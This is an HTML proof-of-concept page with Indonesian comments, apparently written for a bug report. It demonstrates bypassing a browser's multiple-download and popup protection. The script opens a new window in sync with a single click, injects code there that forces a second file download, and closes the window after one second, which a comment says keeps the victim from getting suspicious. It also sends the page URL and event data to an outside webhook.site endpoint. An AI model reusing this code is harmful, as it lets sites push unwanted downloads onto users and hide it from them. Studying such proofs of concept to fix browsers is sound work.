<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <title>Bypass Multiple Download PoC</title>
    <style>
        body {
            font-family: system-ui, sans-serif;
            max-width: 400px;
            margin: 50px auto;
            text-align: center;
        }

        button {
            padding: 12px 24px;
            background: #d93025;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
        }
    </style>
</head>

<body>
    <h2>Bypass Multiple Download</h2>
    <p>Klik tombol untuk mendownload 2 file sekaligus & trigger webhook.</p>
    <button onclick="executeBypass()">Jalankan Payload</button>

    <script>
        const WEBHOOK = "https://webhook.site/fd1f8ae0-9538-4102-9012-b6a41bbcfeb7";

        // 1. Fungsi Download File (Clean & Reusable)
        function downloadFile(filename, content) {
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url); // Bersihkan memori
        }

        // 2. Fungsi Webhook GET Request (no-cors + keepalive)
        function hitWebhook(eventName, extraInfo = "") {
            const params = new URLSearchParams({
                event: eventName,
                info: extraInfo,
                url: document.location.href,
                time: new Date().toISOString()
            });

            fetch(`${WEBHOOK}?${params.toString()}`, {
                method: 'GET',
                mode: 'no-cors',      // Mencegah blokir CORS
                keepalive: true       // Tetap kirim meski tab ditutup
            });
        }

        // 3. Eksekusi Utama (KUNCI BYPASS: Sinkronus, TANPA setTimeout untuk window.open)
        function executeBypass() {
            // Step A: Hit webhook pertama kali (Awal eksekusi)
            hitWebhook("bypass_started", "User clicked button");

            // Step B: Download file 1 (Diizinkan karena ada user gesture / klik langsung)
            downloadFile('file_pertama.txt', 'Halo, ini isi file teks sederhana.\nBaris kedua di sini.');

            // Step C: Buka window baru SECARA SINKRONUS 
            // PENTING: window.open TIDAK BOLEH dibungkus setTimeout, agar tidak diblokir popup blocker
            const newWin = window.open('', '_blank');

            if (newWin) {
                // Step D: Inject dan jalankan download file 2 di window baru
                newWin.document.write(`
                    <html><body>
                    <script>
                        // Hit webhook kedua kali (Konfirmasi bypass berhasil)
                        fetch("${WEBHOOK}?event=bypass_success&file=file_kedua.txt", {
                            method: 'GET',
                            mode: 'no-cors',
                            keepalive: true
                        });

                        // Download file 2 di konteks window baru (Browser mengizinkan ini)
                        const blob = new Blob(['Ini adalah file kedua. Bypass multiple download berhasil!'], { type: 'text/plain' });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 'file_kedua.txt';
                        document.body.appendChild(a);
                        a.click();
                        URL.revokeObjectURL(url);

                        // Tutup window otomatis setelah 1 detik agar korban tidak curiga
                        setTimeout(() => { window.close(); }, 1000);
                    <\/script>
                    </body></html>
                `);
                newWin.document.close(); // Wajib agar browser selesai merender
            } else {
                console.warn("Popup blocker aktif! Pastikan izin popup untuk situs ini.");
            }
        }
    </script>
</body>

</html>
